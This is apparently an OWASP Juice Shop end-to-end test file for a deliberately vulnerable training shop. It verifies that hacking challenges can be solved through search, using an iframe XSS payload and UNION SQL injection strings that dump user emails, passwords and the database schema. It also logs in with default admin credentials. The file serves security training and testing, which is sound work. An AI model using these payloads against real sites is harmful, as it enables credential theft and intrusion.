/*
 * Copyright (c) 2014-2021 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import config = require('config')
const christmasProduct = config.get('products').filter(product => product.useForChristmasSpecialChallenge)[0]
const pastebinLeakProduct = config.get('products').filter(product => product.keywordsForPastebinDataLeakChallenge)[0]
const models = require('../../models/index')

describe('/#/search', () => {
  let searchQuery

  beforeEach(() => {
    browser.get(`${protractor.basePath}/#/search`) // not really necessary as search field is part of navbar on every dialog
    searchQuery = element(by.id('searchQuery'))
  })

  describe('challenge "localXss"', () => {
    it('search query should be susceptible to reflected XSS attacks', () => {
      const inputField = element(by.id('mat-input-0'))
      const EC = protractor.ExpectedConditions

      searchQuery.click()
      inputField.sendKeys('<iframe src="javascript:alert(`xss`)">')
      browser.actions().sendKeys(protractor.Key.ENTER).perform()
      browser.wait(EC.alertIsPresent(), 5000, "'xss' alert is not present on /#/search")
      browser.switchTo().alert().then(alert => {
        expect(alert.getText()).toEqual('xss')
        alert.accept()
      })
    })

    protractor.expect.challengeSolved({ challenge: 'DOM XSS' })
  })

  describe('challenge "xssBonusPayload"', () => {
    it('search query should be susceptible to reflected XSS attacks', () => {
      const inputField = element(by.id('mat-input-0'))
      searchQuery.click()
      inputField.sendKeys('<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>')
      browser.actions().sendKeys(protractor.Key.ENTER).perform()
    })

    protractor.expect.challengeSolved({ challenge: 'Bonus Payload' })
  })
})

describe('/rest/products/search', () => {
  describe('challenge "unionSqlInjection"', () => {
    it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
      browser.driver.get(`${browser.baseUrl}/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--`)
    })

    protractor.expect.challengeSolved({ challenge: 'User Credentials' })
  })

  describe('challenge "dbSchema"', () => {
    it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
      browser.driver.get(`${browser.baseUrl}/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--`)
    })

    protractor.expect.challengeSolved({ challenge: 'Database Schema' })
  })

  describe('challenge "dlpPastebinLeakChallenge"', () => {
    protractor.beforeEach.login({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })

    it('search query should logically reveal the special product', () => {
      browser.driver.get(`${browser.baseUrl}/rest/products/search?q='))--`).then(() => {
        expect(browser.driver.getPageSource()).toContain(pastebinLeakProduct.name)
      })
    })
  })

  xdescribe('challenge "christmasSpecial"', () => {
    protractor.beforeEach.login({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })

    it('search query should reveal logically deleted christmas special product on SQL injection attack', () => {
      browser.driver.get(`${browser.baseUrl}/rest/products/search?q='))--`).then(() => {
        expect(browser.driver.getPageSource()).toContain(christmasProduct.name)
      })
    })

    it('should be able to place Christmas product into shopping card by id', () => {
      browser.waitForAngularEnabled(false)
      models.sequelize.query('SELECT * FROM PRODUCTS').then(([products]) => {
        const christmasProductId = products.filter(product => product.name === christmasProduct.name)[0].id
        browser.executeScript(`var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function () { if (this.status === 201) { console.log("Success") } } ; xhttp.open("POST", "${browser.baseUrl}/api/BasketItems/", true); xhttp.setRequestHeader("Content-type", "application/json"); xhttp.setRequestHeader("Authorization", \`Bearer $\{localStorage.getItem("token")}\`); xhttp.send(JSON.stringify({"BasketId": \`$\{sessionStorage.getItem("bid")}\`, "ProductId":${christmasProductId}, "quantity": 1}))`) // eslint-disable-line
      })
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)

      browser.get(`${protractor.basePath}/#/basket`)
      browser.wait(protractor.ExpectedConditions.presenceOf($('mat-table')), 5000, 'Basket item list not present.') // eslint-disable-line no-undef
      element(by.id('checkoutButton')).click()
    })

    protractor.expect.challengeSolved({ challenge: 'Christmas Special' })
  })
})
